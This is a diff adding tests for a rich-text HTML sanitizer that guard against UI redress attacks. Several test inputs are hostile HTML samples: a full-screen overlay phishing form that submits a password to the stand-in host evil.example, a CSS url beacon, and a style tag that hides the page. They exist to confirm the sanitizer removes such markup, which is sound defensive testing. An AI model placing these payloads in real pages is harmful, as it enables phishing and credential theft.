@@ -1274,3 +1274,71 @@ describe('SANITIZE_OPTIONS iframe security (XSS prevention)', () => {
     expect(iframe?.hasAttribute('allow')).toBe(false);
   });
 });
+
+describe('SANITIZE_OPTIONS UI redress prevention', () => {
+  it.each(['style', 'form', 'input', 'button', 'textarea', 'select', 'option'])(
+    'should remove the `%s` element',
+    (tag) => {
+      const sanitized = sanitizeRichTextHTML(`<p>Hello <${tag}>x</${tag}></p>`);
+
+      expect(sanitized).not.toContain(`<${tag}`);
+    },
+  );
+
+  it('should remove a stylesheet that would restyle the whole app', () => {
+    const sanitized = sanitizeRichTextHTML('<p>Hello <style>body { display: none }</style></p>');
+
+    expect(sanitized).toBe('<p>Hello </p>');
+  });
+
+  it('should remove a phishing form overlaid on the app', () => {
+    const sanitized = sanitizeRichTextHTML(
+      '<div style="position: fixed; inset: 0; z-index: 9999">' +
+        '<form action="https://evil.example/x"><input type="password" name="t">' +
+        '<button>Sign in</button></form></div>',
+    );
+
+    expect(sanitized).not.toMatch(/form|input|button|position|inset|z-index|evil/);
+  });
+
+  it('should drop positioning and other disallowed CSS from inline styles', () => {
+    const sanitized = sanitizeRichTextHTML(
+      '<div style="position: absolute; top: 0; left: 0; transform: translate(-100px); ' +
+        'background: url(https://evil.example/a.png) red; color: blue">x</div>',
+    );
+
+    expect(sanitized).not.toMatch(/position|top|left|transform|url|evil|background-image/);
+    expect(sanitized).toMatch(/style="[^"]*color: blue/);
+    expect(sanitized).toMatch(/style="[^"]*background-color: red/);
+  });
+
+  it('should remove the style attribute when no property is allowed', () => {
+    expect(sanitizeRichTextHTML('<p style="position: fixed">x</p>')).toBe('<p>x</p>');
+    expect(sanitizeRichTextHTML('<p style="">x</p>')).toBe('<p>x</p>');
+  });
+
+  it('should keep the inline styles of syntax highlighting', () => {
+    const shiki =
+      '<pre class="shiki github-light" style="background-color:#fff;color:#24292e" tabindex="0">' +
+      '<code><span class="line"><span style="color:#D73A49;font-style:italic;font-weight:bold;' +
+      'text-decoration:underline">const</span></span></code></pre>';
+
+    const sanitized = sanitizeRichTextHTML(shiki);
+
+    expect(sanitized).toContain('style="background-color:#fff;color:#24292e"');
+    expect(sanitized).toContain('font-style:italic;font-weight:bold;text-decoration:underline');
+  });
+
+  it('should keep inline sizing and alignment used in content', () => {
+    const html =
+      '<p style="text-align: center"><img src="a.png" style="width: 50%; max-width: 300px"></p>';
+
+    expect(sanitizeRichTextHTML(html)).toBe(html);
+  });
+
+  it('should keep the !important priority of an allowed property', () => {
+    expect(sanitizeRichTextHTML('<p style="position: fixed; color: red !important">x</p>')).toMatch(
+      /<p style="color: red !important;?">x<\/p>/,
+    );
+  });
+});
